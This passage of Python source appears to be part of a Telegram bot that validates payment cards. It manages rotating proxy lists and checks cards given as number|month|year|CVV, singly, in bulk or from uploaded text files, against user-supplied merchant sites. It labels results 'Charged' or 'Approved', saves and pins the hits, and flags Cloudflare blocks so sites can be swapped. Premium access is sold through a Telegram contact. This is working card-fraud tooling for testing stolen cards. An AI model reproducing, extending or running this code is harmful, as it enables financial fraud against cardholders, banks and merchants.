            emoji_ids.extend([CE["check"]] * len(removed_sites))
        if not_found_sites:
            response_parts.append("\n".join(f"{PE} Not Found: {s}" for s in not_found_sites))
            emoji_ids.extend([CE["cross"]] * len(not_found_sites))
        if response_parts:
            await styled_reply(event, "\n\n".join(response_parts), emoji_ids=emoji_ids)
        else:
            await styled_reply(event, f"{PE} No sites removed", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern='/addpxy'))
async def add_proxy_cmd(event):
    if event.is_group:
        return await event.reply("⛔ Private chat only")

    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

    try:
        proxy_lines = []

        # Case 1: User replied to a file or message
        if event.is_reply:
            reply_msg = await event.get_reply_message()

            # If file
            if reply_msg.file:
                file_path = await reply_msg.download_media()
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        proxy_lines = [line.strip() for line in f.read().splitlines() if line.strip()]
                finally:
                    try:
                        os.remove(file_path)
                    except:
                        pass

            # If text message
            elif reply_msg.text:
                proxy_lines = [line.strip() for line in reply_msg.text.splitlines() if line.strip()]

        # Case 2: User typed proxies in command
        else:
            parts = event.raw_text.split(maxsplit=1)
            if len(parts) == 2:
                proxy_lines = [line.strip() for line in parts[1].splitlines() if line.strip()]
            else:
                return await event.reply(
                    "**Usage:**\n"
                    "`/addpxy ip:port:user:pass`\n"
                    "OR send multiple proxies (one per line)\n"
                    "OR reply to a .txt file with `/addpxy`\n\n"
                    "**Supported formats:**\n"
                    "`ip:port:user:pass`\n"
                    "`user:pass@ip:port`\n"
                    "`ip:port` (no auth)\n"
                    "`socks5://user:pass@ip:port`"
                )

        if not proxy_lines:
            return await event.reply(
                "✗ No proxy lines found\n\n"
                "Use: `ip:port:username:password` (one per line)"
            )

        await ensure_user(event.sender_id)
        current_count = await get_proxy_count(event.sender_id)

        if current_count >= 100:
            return await event.reply("✗ Proxy limit reached (100/100)\n\nUse /rmpxy to remove old ones.")

        # Get existing proxies to check duplicates
        existing_proxies = await get_all_user_proxies(event.sender_id)
        existing_urls = {p['proxy_url'] for p in existing_proxies}

        # Parse all proxy lines using the global parse_proxy_format function
        parsed_proxies = []
        invalid_lines = []
        duplicate_lines = []

        for line in proxy_lines:
            proxy_data = parse_proxy_format(line)
            if not proxy_data:
                invalid_lines.append(line)
                continue

            if proxy_data['proxy_url'] in existing_urls:
                duplicate_lines.append(line)
                continue

            parsed_proxies.append(proxy_data)
            existing_urls.add(proxy_data['proxy_url'])  # prevent duplicates within batch

        if not parsed_proxies and not duplicate_lines:
            return await event.reply(
                "✗ No valid proxies found\n\n"
                "**Supported formats:**\n"
                "`ip:port:user:pass`\n"
                "`user:pass@ip:port`\n"
                "`ip:port` (no auth)\n"
                "`socks5://user:pass@ip:port`"
            )

        if not parsed_proxies and duplicate_lines:
            return await event.reply(f"⚠ All {len(duplicate_lines)} proxies already exist in your list")

        # Check how many we can still add
        slots_available = 100 - current_count
        if len(parsed_proxies) > slots_available:
            parsed_proxies = parsed_proxies[:slots_available]
            await event.reply(f"⚠ Only adding {slots_available} proxies (limit: 100)")

        # Test and add proxies
        testing_msg = await event.reply(
            f"```◈ Testing {len(parsed_proxies)} proxy(ies)...```"
        )

        added = []
        failed = []

        for i, proxy_data in enumerate(parsed_proxies, 1):
            proxy_type_display = proxy_data.get('type', 'http').upper()
            display = f"{proxy_data['ip']}:{proxy_data['port']}"

            # Update progress for bulk adds
            if len(parsed_proxies) > 1:
                try:
                    await testing_msg.edit(
                        f"```◈ Testing proxy {i}/{len(parsed_proxies)}...\n"
                        f"━ {proxy_type_display} ━ {display}\n"
                        f"✓ Added: {len(added)} | ✗ Failed: {len(failed)}```"
                    )
                except Exception:
                    pass

            is_working, result = await test_proxy(proxy_data['proxy_url'])

            if is_working:
                await add_proxy_db(event.sender_id, proxy_data)
                added.append({
                    'proxy': proxy_data,
                    'ip': result,
                    'display': display,
                    'type': proxy_type_display
                })
            else:
                failed.append({
                    'proxy': proxy_data,
                    'error': result,
                    'display': display,
                    'type': proxy_type_display
                })

        # Build final response
        new_count = current_count + len(added)
        response_lines = []

        if len(parsed_proxies) == 1:
            # Single proxy - detailed response
            if added:
                p = added[0]
                auth_display = f"┃ Auth: {p['proxy']['username']}" if p['proxy'].get('username') else "┃ No Auth"
                await testing_msg.edit(
                    f"✦ **Proxy Added**\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"┃ IP: {p['ip']}\n"
                    f"┃ Proxy: {p['display']}\n"
                    f"┃ Type: {p['type']}\n"
                    f"{auth_display}\n"
                    f"┃ Total: {new_count}/100"
                )
            else:
                f = failed[0]
                await testing_msg.edit(
                    f"✗ **Proxy not working**\n\n"
                    f"┃ Proxy: {f['display']}\n"
                    f"┃ Type: {f['type']}\n"
                    f"┃ Error: {f['error']}"
                )
        else:
            # Multiple proxies - summary response
            result_text = f"✦ **Proxy Import Results**\n━━━━━━━━━━━━━━━━━━━\n"

            if added:
                result_text += f"\n**✓ Added ({len(added)}):**\n"
                for p in added:
                    auth = f" ━ {p['proxy']['username']}" if p['proxy'].get('username') else ""
                    result_text += f"  ✓ {p['type']} ━ {p['display']}{auth} ━ {p['ip']}\n"

            if failed:
                result_text += f"\n**✗ Failed ({len(failed)}):**\n"
                for f in failed[:10]:  # Limit to 10 to avoid message too long
                    error_short = str(f['error'])[:50]
                    result_text += f"  ✗ {f['type']} ━ {f['display']} ━ {error_short}\n"
                if len(failed) > 10:
                    result_text += f"  ... and {len(failed) - 10} more\n"

            if duplicate_lines:
                result_text += f"\n**⚠ Duplicates skipped: {len(duplicate_lines)}**\n"

            if invalid_lines:
                result_text += f"\n**⚠ Invalid format skipped: {len(invalid_lines)}**\n"

            result_text += f"\n━━━━━━━━━━━━━━━━━━━\n"
            result_text += f"┃ Total proxies: {new_count}/100"

            await testing_msg.edit(result_text)

    except Exception as e:
        await event.reply(f"✗ Error: {e}")
        

@client.on(events.NewMessage(pattern='/rmpxy'))
async def remove_proxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} <b>Private chat only</b>", emoji_ids=[CE["stop"]])

    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

    try:
        user_proxies = await get_all_user_proxies(event.sender_id)

        if not user_proxies:
            return await styled_reply(event, f"{PE} No proxies saved", emoji_ids=[CE["cross"]])

        parts = event.raw_text.split(maxsplit=1)

        if len(parts) == 1:
            return await styled_reply(event, f"{PE} Format: /rmpxy index\nOr: /rmpxy all\n\nUse /proxy to see index numbers", emoji_ids=[CE["warn"]])

        arg = parts[1].strip().lower()

        if arg == 'all':
            count = await clear_all_proxies(event.sender_id)
            return await styled_reply(event, f"{PE} All {count} proxies removed", emoji_ids=[CE["check"]])

        try:
            index = int(arg) - 1
            if index < 0 or index >= len(user_proxies):
                return await styled_reply(event, f"{PE} Invalid index\n\nYou have {len(user_proxies)} proxies (1-{len(user_proxies)})", emoji_ids=[CE["cross"]])

            removed_proxy = await remove_proxy_by_index(event.sender_id, index)
            remaining = len(user_proxies) - 1

            await styled_reply(event, f"{PE} Proxy removed\n━━━━━━━━━━━━━━━━━\n━ {removed_proxy['ip']}:{removed_proxy['port']}\n━ Remaining: {remaining}", emoji_ids=[CE["check"]])

        except ValueError:
            return await styled_reply(event, f"{PE} Invalid index\n\nUse: /rmpxy 1 or /rmpxy all", emoji_ids=[CE["cross"]])

    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern='/proxy'))
async def view_proxy(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} <b>Private chat only</b>", emoji_ids=[CE["stop"]])

    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

    try:
        user_proxies = await get_all_user_proxies(event.sender_id)

        if not user_proxies:
            return await styled_reply(event, f"{PE} No proxies saved\n\nUse /addpxy to add one.", emoji_ids=[CE["cross"]])

        proxy_lines = []
        proxy_emojis = [CE["shield"]]
        for idx, proxy_data in enumerate(user_proxies, 1):
            proxy_type = proxy_data.get('proxy_type', 'http').upper()
            auth_info = ""
            if proxy_data.get('username'):
                auth_info = f" ━ {proxy_data['username']}"
            proxy_lines.append(f"<code>{idx}.</code> {PE} {proxy_type} ━ {proxy_data['ip']}:{proxy_data['port']}{auth_info}")
            proxy_emojis.append(CE["link"])

        proxy_list = f"{PE} <b>PROFILE</b> ({len(user_proxies)}/10)\n━━━━━━━━━━━━━━━━━\n"
        proxy_list += "\n".join(proxy_lines)
        proxy_list += f"\n\n━━━━━━━━━━━━━━━━━\n{PE} Random selection per check\n{PE} <code>/rmpxy index</code> to remove\n{PE} <code>/rmpxy all</code> to clear"
        proxy_emojis.extend([CE["star"], CE["trash"], CE["trash"]])

        await styled_reply(event, proxy_list, emoji_ids=proxy_emojis)

    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} <b>Private chat only</b>", emoji_ids=[CE["stop"]])

    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

    try:
        user_proxies = await get_all_user_proxies(event.sender_id)

        if not user_proxies:
            return await styled_reply(event, f"{PE} No proxies saved\n\nUse /addpxy to add one.", emoji_ids=[CE["cross"]])

        status_msg = await styled_reply(event, f"<pre>{PE} Testing {len(user_proxies)} proxies...</pre>", emoji_ids=[CE["shield"]])

        working = []
        dead = []
        working_emojis = []
        dead_emojis = []

        for idx, proxy_data in enumerate(user_proxies, 1):
            proxy_url = proxy_data.get('proxy_url', '')
            proxy_type = proxy_data.get('proxy_type', 'http').upper()
            display = f"{proxy_data['ip']}:{proxy_data['port']}"

            is_working, result_ip = await test_proxy(proxy_url)

            if is_working:
                working.append(f"{PE} <code>{idx}.</code> {proxy_type} ━ {display} ━ {result_ip}")
                working_emojis.append(CE["tick"])
            else:
                dead.append(f"{PE} <code>{idx}.</code> {proxy_type} ━ {display}")
                dead_emojis.append(CE["cross"])

            try:
                await styled_edit(status_msg, f"<pre>{PE} Testing proxies {PE} {idx}/{len(user_proxies)}</pre>", emoji_ids=[CE["shield"], CE["search"]])
            except Exception:
                pass

        result_emojis = [CE["shield"]]
        result_text = f"{PE} <b>PROXY CHECK</b>\n━━━━━━━━━━━━━━━━━\n"

        if working:
            result_text += "<b>Working:</b>\n" + "\n".join(working) + "\n\n"
            result_emojis.extend(working_emojis)
        if dead:
            result_text += "<b>Dead:</b>\n" + "\n".join(dead) + "\n\n"
            result_emojis.extend(dead_emojis)

        result_text += f"━━━━━━━━━━━━━━━━━\n{PE} {len(working)} working ━ {PE} {len(dead)} dead ━ {PE} {len(user_proxies)} total"
        result_emojis.extend([CE["tick"], CE["cross"], CE["star"]])

        if dead:
            result_text += f"\n\n{PE} Use <code>/rmpxy index</code> to remove dead proxies"
            result_emojis.append(CE["trash"])

        await styled_edit(status_msg, result_text, emoji_ids=result_emojis)

    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh\b'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    if not can_access:
        kb = [[pbtn("🔗 Join Group", url="https://t.me/+pNplrRLrEGY5NTU0")]]
        await styled_reply(event, "<b>ACCESS DENIED</b>\n\nUse in group for free or get premium.\n━ Contact @MRROOTTG", kb, emoji_ids=[CE["stop"]])
        return
    await ensure_user(event.sender_id)
    asyncio.create_task(process_sh_card(event, access_type))


async def process_sh_card(event, access_type):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except Exception:
        username = f"user_{event.sender_id}"

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n━━━━━━━━━━━━━━━━━\nAdd one first:\n<code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["warn"]])

    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = extract_card(replied_msg.text)
        if not card:
            return await styled_reply(event, f"{PE} <b>NO CARD FOUND</b>\n\nFormat: <code>/sh 4111111111111111|12|2025|123</code>", emoji_ids=[CE["cross"]])
    else:
        card = extract_card(event.raw_text)
        if not card:
            return await styled_reply(event, f"{PE} <b>USAGE</b>\n\n<code>/sh 4111111111111111|12|2025|123</code>\n\nOr reply to a message with CC info", emoji_ids=[CE["warn"]])

    user_sites = await get_user_sites(event.sender_id)
    if not user_sites:
        return await styled_reply(event, f"{PE} No sites found. Add with <code>/add</code>", emoji_ids=[CE["warn"]])

    loading_msg = await event.reply("?")
    start_time = time.time()

    async def animate_loading():
        emojis = ["⏳", "⏳⏳", "⏳⏳⏳", "⏳⏳⏳⏳", "⏳⏳⏳⏳⏳"]
        i = 0
        while True:
            try:
                await loading_msg.edit(emojis[i % 5])
                await asyncio.sleep(0.5)
                i += 1
            except Exception:
                break

    loading_task = asyncio.create_task(animate_loading())
    try:
        res, site_index = await check_card_with_retry(card, user_sites, event.sender_id, max_retries=3)
        loading_task.cancel()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])

        status = res.get("Status", "Declined")
        response_text_lower = res.get("Response", "").lower()

        header_emojis = []
        if "cloudflare" in response_text_lower:
            status_header = f"{PE} ━━━━━━━━━━━━━━━━━━ {PE}"
            header_emojis = [CE["warn"], CE["warn"]]
            res["Response"] = "Cloudflare detected ━ change site or retry"
            is_charged = False
        elif status == "Error" or status == "SiteError":
            status_header = f"{PE} CLOUDFLARE {PE}"
            header_emojis = [CE["cross"], CE["cross"]]
            is_charged = False
        else:
            status_header, header_emojis = get_status_header(status)
            is_charged = (status == "Charged")

        if status == "Charged":
            await save_approved_card(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif status == "Approved":
            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))

        msg = f"""{status_header}
━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ {res.get('Gateway', 'Unknown')}
━━━━━━━━━━━━━━━━━
Response ━ {res.get('Response')}
Price ━ {res.get('Price')}
Card ━ {site_index}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>

⏱ {elapsed_time}s"""

        await loading_msg.delete()
        result_msg = await styled_reply(event, msg, emoji_ids=header_emojis)
        if is_charged:
            await pin_charged_message(event, result_msg)
            is_private = event.chat.id == event.sender_id
            if is_private:
                await send_hit_notification(client, card, res, username, event.sender_id)
    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh\b'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    if not can_access:
        kb = [[pbtn("🔗 Join Group", url="https://t.me/+pNplrRLrEGY5NTU0")]]
        await styled_reply(event, "<b>ACCESS DENIED</b>\n\nUse in group for free or get premium.\n━ Contact @MRROOTTG", kb, emoji_ids=[CE["stop"]])
        return

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n━━━━━━━━━━━━━━━━━\nAdd one first:\n<code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["warn"]])

    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            cards = extract_all_cards(replied_msg.text)
        if not cards:
            return await styled_reply(event, f"{PE} <b>PROFILE</b>\n\nFormat: <code>/msh CC|MM|YY|CVV CC|MM|YY|CVV</code>", emoji_ids=[CE["cross"]])
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards:
            return await styled_reply(event, f"{PE} <b>USAGE</b>\n\n<code>/msh CC|MM|YY|CVV CC|MM|YY|CVV</code>\n\nOr reply to a message with multiple cards", emoji_ids=[CE["warn"]])

    if len(cards) > 20:
        cards = cards[:20]
        await styled_reply(event, f"<pre>{PE} Only checking first 20 cards. Limit is 20 cards for /msh.</pre>", emoji_ids=[CE["warn"]])

    await ensure_user(event.sender_id)
    user_sites = await get_user_sites(event.sender_id)
    if not user_sites:
        return await styled_reply(event, f"{PE} No sites found. Add with <code>/add</code>", emoji_ids=[CE["warn"]])

    user_id = event.sender_id
    kb = [
        [pbtn("✅ Yes ━ Charged + Approved", f"msh_pref:yes:{user_id}")],
        [pbtn("❌ No ━ Only Charged", f"msh_pref:no:{user_id}")]
    ]

    pref_msg = await styled_reply(event,
        f"{PE} <b>FILTER MODE</b>\n━━━━━━━━━━━━━━━━━\n"
        "<i>✅ Yes: Charged + Approved cards</i>\n"
        "❌ <i>No: Only Charged cards</i>",
        kb, emoji_ids=[CE["chart"], CE["gem"]]
    )

    USER_APPROVED_PREF[f"msh_{user_id}"] = {
        "cards": cards,
        "sites": user_sites,
        "event": event,
        "pref_msg": pref_msg
    }


@client.on(events.CallbackQuery(pattern=rb"msh_pref:(yes|no):(\d+)"))
async def msh_pref_callback(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        return await event.answer("This is not your session!", alert=True)

    key = f"msh_{user_id}"
    data = USER_APPROVED_PREF.pop(key, None)
    if not data:
        return await event.answer("Session expired! Please try again.", alert=True)

    send_approved = (pref == "yes")

    try:
        await data["pref_msg"].delete()
    except Exception:
        pass

    await event.answer("Starting check...", alert=False)
    asyncio.create_task(process_msh_cards(data["event"], data["cards"], data["sites"], send_approved))


async def process_msh_cards(event, cards, sites, send_approved=True):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except Exception:
        username = f"user_{event.sender_id}"

    mode_text = "Charged + Approved" if send_approved else "Only Charged"
    sent_msg = await styled_reply(event, f"<pre>{PE} Processing ━ {len(cards)} cards ━ {mode_text}</pre>", emoji_ids=[CE["chart"]])
    current_site_index = 0
    is_private = event.chat.id == event.sender_id
    BATCH_SIZE = 20

    try:
        for batch_start in range(0, len(cards), BATCH_SIZE):
            batch = cards[batch_start:batch_start + BATCH_SIZE]

            tasks = []
            batch_sites = []
            for card in batch:
                current_site = sites[current_site_index % len(sites)]
                batch_sites.append((current_site, current_site_index % len(sites) + 1))
                tasks.append(check_card_specific_with_retry(card, current_site, event.sender_id, all_sites=sites, max_retries=3))
                current_site_index += 1

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for i, (card, result) in enumerate(zip(batch, results)):
                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-", "Status": "Error"}

                status = result.get("Status", "Declined")
                response_text_lower = result.get("Response", "").lower()
                site_info = batch_sites[i]

                header_emojis = []
                if "cloudflare" in response_text_lower:
                    status_header = f"{PE} ━━━━━━━━━━━━━━━━━━ {PE}"
                    header_emojis = [CE["warn"], CE["warn"]]
                    result["Response"] = "Cloudflare detected ━ change site or retry"
                    is_charged = False
                elif status in ["Error", "SiteError"]:
                    status_header = f"{PE} CLOUDFLARE {PE}"
                    header_emojis = [CE["cross"], CE["cross"]]
                    is_charged = False
                else:
                    status_header, header_emojis = get_status_header(status)
                    is_charged = (status == "Charged")

                if status == "Charged":
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                elif status == "Approved":
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))

                should_send = False
                if status == "Charged":
                    should_send = True
                elif status == "Approved" and send_approved:
                    should_send = True
                elif status in ["Declined", "Error", "SiteError"]:
                    should_send = True

                if should_send:
                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                    card_msg = f"""{status_header}
━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ {result.get('Gateway', 'Unknown')}
━━━━━━━━━━━━━━━━━
Response ━ {result.get('Response')}
Price ━ {result.get('Price')}
Card ━ {site_info[1]}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>
"""
                    result_msg = await styled_reply(event, card_msg, emoji_ids=header_emojis)
                    if is_charged:
                        await pin_charged_message(event, result_msg)
                        if is_private:
                            await send_hit_notification(client, card, result, username, event.sender_id)

        await styled_edit(sent_msg, f"<pre>{PE} Mass Check Complete {PE} {len(cards)} cards processed</pre>", emoji_ids=[CE["check"], CE["tick"]])
    except Exception as e:
        try:
            await styled_edit(sent_msg, f"{PE} Mass check error: {e}", emoji_ids=[CE["cross"]])
        except Exception:
            await styled_reply(event, f"{PE} Mass check error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def mtxt_cmd(event):
    can_access, access_type, plan = await get_user_access(event)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

    cc_limit = get_cc_limit(plan, event.sender_id)

    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"<pre>{PE} Already processing ━ wait for completion</pre>", emoji_ids=[CE["star"]])

    try:
        if not event.reply_to_msg_id:
            return await styled_reply(event, f"<pre>{PE} Reply to a .txt file with /mtxt</pre>", emoji_ids=[CE["warn"]])

        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await styled_reply(event, f"<pre>{PE} Reply to a .txt file with /mtxt</pre>", emoji_ids=[CE["warn"]])

        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f:
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try:
                os.remove(file_path)
            except:
                pass
            return await styled_reply(event, f"{PE} Error reading file: {e}", emoji_ids=[CE["cross"]])

        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards:
            return await styled_reply(event, f"{PE} No valid CCs found", emoji_ids=[CE["cross"]])

        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await styled_reply(event, f"<pre>{PE} Found {total_cards_found} CCs\n━ Limit: {cc_limit} CCs\n{PE} Checking {len(cards)} CCs</pre>", emoji_ids=[CE["star"], CE["check"]])
        else:
            await styled_reply(event, f"<pre>{PE} Found {total_cards_found} valid CCs\n{PE} Checking all {len(cards)} CCs</pre>", emoji_ids=[CE["star"], CE["check"]])

        await ensure_user(event.sender_id)
        user_sites = await get_user_sites(event.sender_id)
        if not user_sites:
            return await styled_reply(event, f"{PE} No sites found. Add with <code>/add</code>", emoji_ids=[CE["warn"]])

        kb = [
            [pbtn("✅ Yes ━ Charged + Approved", f"mtxt_pref:yes:{user_id}")],
            [pbtn("❌ No ━ Only Charged", f"mtxt_pref:no:{user_id}")]
        ]

        pref_msg = await styled_reply(event,
            f"{PE} <b>FILTER MODE</b>\n━━━━━━━━━━━━━━━━━\n"
            "<i>✅ Yes: Charged + Approved cards</i>\n"
            "❌ <i>No: Only Charged cards</i>",
            kb, emoji_ids=[CE["pin"], CE["gem"]]
        )

        USER_APPROVED_PREF[f"mtxt_{user_id}"] = {
            "cards": cards,
            "sites": user_sites.copy(),
            "event": event,
            "pref_msg": pref_msg
        }

    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.CallbackQuery(pattern=rb"mtxt_pref:(yes|no):(\d+)"))
async def mtxt_pref_callback(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        return await event.answer("This is not your session!", alert=True)

    key = f"mtxt_{user_id}"
    data = USER_APPROVED_PREF.pop(key, None)
    if not data:
        return await event.answer("Session expired! Please try again.", alert=True)

    send_approved = (pref == "yes")

    try:
        await data["pref_msg"].delete()
    except Exception:
        pass

    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.answer("Already running!", alert=True)

    ACTIVE_MTXT_PROCESSES[user_id] = True
    await event.answer("Starting check...", alert=False)
    asyncio.create_task(process_mtxt_cards(data["event"], data["cards"], data["sites"], send_approved))


async def process_mtxt_cards(event, cards, local_sites, send_approved=True):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except Exception:
        username = f"user_{event.sender_id}"

    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
    is_private = event.chat.id == event.sender_id
    mode_text = "Charged + Approved" if send_approved else "Only Charged"
    status_msg = await styled_reply(event, f"<pre>Processing ━ {mode_text}</pre>")
    current_site_index = 0
    BATCH_SIZE = 20
    last_card_display = ""
    last_response_display = ""
    last_site_display = ""

    try:
        idx = 0
        while idx < total:
            if not local_sites:
                await styled_edit(status_msg, f"{PE} <b>All sites dead</b>\nAdd fresh sites with <code>/add</code>", emoji_ids=[CE["cross"]])
                break

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""{PE} STOPPED
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Checked ━ {checked}/{total}
"""
                final_kb = [
                    [pbtn(f"💰 Charged ━ {charged}", "none")],
                    [pbtn(f"✅ Approved ━ {approved}", "none")],
                    [pbtn(f"🛑 Stopped ━ {checked}/{total}", "none")]
                ]
                try:
                    await styled_edit(status_msg, final_caption, buttons=final_kb, emoji_ids=[CE["stop"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["star"]])
                except Exception:
                    pass
                return

            batch = cards[idx:idx + BATCH_SIZE]

            tasks = []
            batch_sites = []
            for card in batch:
                if not local_sites:
                    break
                current_site = local_sites[current_site_index % len(local_sites)]
                site_idx = current_site_index % len(local_sites) + 1
                batch_sites.append((current_site, site_idx))
                tasks.append(check_card_specific_with_retry(card, current_site, user_id, all_sites=local_sites, max_retries=3))
                current_site_index += 1

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for i, (card, result) in enumerate(zip(batch, results)):
                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-", "Status": "Error"}

                checked += 1
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()
                status = result.get("Status", "Declined")

                current_site_info = batch_sites[i] if i < len(batch_sites) else ("?", "?")
                current_site = current_site_info[0]
                display_site_index = current_site_info[1]

                last_card_display = f"{card[:12]}****"
                last_response_display = result.get('Response', '')[:25]
                last_site_display = display_site_index

                if status in ["SiteError", "Error"]:
                    errors += 1
                    if is_site_error(response_text) and current_site in local_sites:
                        local_sites.remove(current_site)
                        current_site_index = 0

                    if not local_sites:
                        final_caption = f"""{PE} <b>All sites dead</b>
Add fresh sites with <code>/add</code>

{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
{PE} Checked ━ {checked}/{total}
"""
                        final_kb = [
                            [pbtn(f"💰 Charged ━ {charged}", "none")],
                            [pbtn(f"✅ Approved ━ {approved}", "none")],
                            [pbtn(f"💀 Sites Dead ━ {checked}/{total}", "none")]
                        ]
                        try:
                            await styled_edit(status_msg, final_caption, buttons=final_kb, emoji_ids=[CE["cross"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["star"]])
                        except Exception:
                            pass
                        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                        return
                    continue

                if "cloudflare" in response_text_lower:
                    errors += 1
                    continue

                should_send_message = False
                header_emojis = []

                if status == "Charged":
                    charged += 1
                    status_header, header_emojis = get_status_header(status)
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif status == "Approved":
                    approved += 1
                    status_header, header_emojis = get_status_header(status)
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    if send_approved:
                        should_send_message = True
                else:
                    declined += 1
                    status_header, header_emojis = get_status_header(status)

                if should_send_message:
                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                    card_msg = f"""{status_header}
━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ {result.get('Gateway', 'Unknown')}
━━━━━━━━━━━━━━━━━
Response ━ {result.get('Response')}
Price ━ {result.get('Price')}
Card ━ {display_site_index}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>
"""
                    result_msg = await styled_reply(event, card_msg, emoji_ids=header_emojis)
                    if status == "Charged":
                        await pin_charged_message(event, result_msg)
                        if is_private:
                            await send_hit_notification(client, card, result, username, event.sender_id)

            kb = [
                [pbtn(f"💳 {last_card_display}", "none")],
